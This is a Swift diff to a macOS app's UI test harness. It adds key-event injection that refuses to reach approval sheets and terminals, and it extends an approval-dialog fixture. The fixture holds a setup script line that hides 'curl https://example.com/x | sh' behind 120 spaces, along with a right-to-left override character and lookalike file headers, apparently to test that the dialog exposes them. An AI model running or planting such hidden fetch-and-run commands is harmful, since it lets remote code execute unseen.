@@ -9,6 +9,7 @@ final class TestHarness {
     static let defaultSize = NSSize(width: 1200, height: 800)
 
     private let probes = NSHashTable<TestProbeNSView>.weakObjects()
+    private let monitors = NSHashTable<KeyMonitorView>.weakObjects()
     private var presenters: [String: (Bool) -> Void] = [:]
     private var sized = Set<Int>()
     private var timer: Timer?
@@ -33,13 +34,17 @@ final class TestHarness {
     }
 
     private static var approvalFixture: ConfirmRequest {
-        let lines = ["──── .clubmate/setup.sh", "echo ok" + String(repeating: " ", count: 120) + "; curl https://example.com/x | sh", "npm ci --prefer-offline --no-audit --no-fund && npx playwright install --with-deps chromium firefox webkit # \u{202E}long line"] + (1...90).map { "echo step \($0)" } + ["", "──── .clubmate/worktree-include", ".env"]
+        let lines = ["──── .clubmate/setup.sh", "━━━━ .clubmate/teardown.sh", "———— .clubmate/teardown.sh", "echo ok" + String(repeating: " ", count: 120) + "; curl https://example.com/x | sh", "npm ci --prefer-offline --no-audit --no-fund && npx playwright install --with-deps chromium firefox webkit # \u{202E}long line"] + (1...90).map { "echo step \($0)" } + ["", "──── .clubmate/worktree-include", ".env"]
         let args = ["repo": "/Users/someone/develop/organisation/a-rather-long-repository-name", "worktree": "/Users/someone/develop/organisation/a-rather-long-repository-name/.worktrees/feat/some-feature", "sha256": "9f2c4e1a7b3d5f60812e4c9a0b7d3f1e2c5a8b9d0e1f2a3b4c5d6e7f8a9b0c1d", "size": "2410 bytes, 91 lines", "trusts": "all of .clubmate/ (2 entries, shown below)"]
         return ConfirmRequest(title: "Run .clubmate/setup.sh", workspace: "a-rather-long-repository-name", command: "git.worktree-hooks", args: .object(args.mapValues { .string($0) }), body: lines.joined(separator: "\n") + "\n", plugin: true)
     }
 
     func register(_ probe: TestProbeNSView) {
         probes.add(probe)
+    }
+
+    func register(_ monitor: KeyMonitorView) {
+        monitors.add(monitor)
     }
 
     func register(_ target: String, _ present: @escaping (Bool) -> Void) {
@@ -51,11 +56,62 @@ final class TestHarness {
     }
 
     func present(_ request: PresentRequest) throws -> Bool {
+        if request.target.hasPrefix("card:") {
+            ToolExpansion.shared.set(card: String(request.target.dropFirst(5)), expanded: request.shown)
+            return request.shown
+        }
         guard let present = presenters[request.target] else {
             throw TestModeError("unknown target \(request.target); known: \(presenters.keys.sorted().joined(separator: ", "))")
         }
         present(request.shown)
         return request.shown
+    }
+
+    func key(_ request: KeyRequest) async throws -> [String] {
+        let combos = try request.keys.map { key in
+            guard let combo = KeyCombo(key) else { throw TestModeError("unknown key \(key); use [cmd+][ctrl+][opt+][shift+]<a-z, 0-9, punctuation, return, tab, space, delete, esc, up, down, left, right>") }
+            return combo
+        }
+        guard let window = try request.focus.map(focus) ?? NSApp.promptWindow else { throw TestModeError("no window to send keys to") }
+        var routes: [String] = []
+        for combo in combos {
+            if NSApp.modalWindow != nil || NSApp.windows.contains(where: { $0.isVisible && $0.sheetParent != nil }) {
+                throw TestModeError("a sheet or alert is open; keys are never sent to approvals")
+            }
+            if window.firstResponder is TerminalSurfaceView {
+                throw TestModeError("a terminal has focus; keys are never sent to terminals")
+            }
+            var flags: NSEvent.ModifierFlags = []
+            if combo.command { flags.insert(.command) }
+            if combo.control { flags.insert(.control) }
+            if combo.option { flags.insert(.option) }
+            if combo.shift { flags.insert(.shift) }
+            let event = { (type: NSEvent.EventType) in
+                NSEvent.keyEvent(with: type, location: .zero, modifierFlags: flags, timestamp: ProcessInfo.processInfo.systemUptime, windowNumber: window.windowNumber, context: nil, characters: combo.characters, charactersIgnoringModifiers: combo.charactersIgnoringModifiers, isARepeat: false, keyCode: combo.keyCode)
+            }
+            guard let down = event(.keyDown), let up = event(.keyUp) else { throw TestModeError("cannot build a key event") }
+            if monitors.allObjects.contains(where: { $0.deliver(down) }) {
+                routes.append("monitor")
+            } else if combo.command, window.performKeyEquivalent(with: down) {
+                routes.append("shortcut")
+            } else {
+                window.sendEvent(down)
+                window.sendEvent(up)
+                routes.append("responder \(window.firstResponder.map { String(describing: type(of: $0)).prefix { $0 != "<" } } ?? "none")")
+            }
+            try await Task.sleep(for: .milliseconds(50))
+        }
+        return routes
+    }
+
+    private func focus(_ id: String) throws -> NSWindow {
+        guard let probe = probes.allObjects.first(where: { $0.nodeID == id && $0.window != nil }), let window = probe.window, let frame = window.contentView?.superview else {
+            throw TestModeError("no node \(id); use an id from the snapshot layout")
+        }
+        var view = frame.hitTest(frame.convert(probe.convert(NSPoint(x: probe.bounds.midX, y: probe.bounds.midY), to: nil), from: nil))
+        while let candidate = view, !candidate.acceptsFirstResponder { view = candidate.superview }
+        guard let view, !(view is TerminalSurfaceView), window.makeFirstResponder(view) else { throw TestModeError("node \(id) cannot take focus") }
+        return window
     }
 
     func snapshot(_ request: SnapshotRequest) async throws -> SnapshotResult {
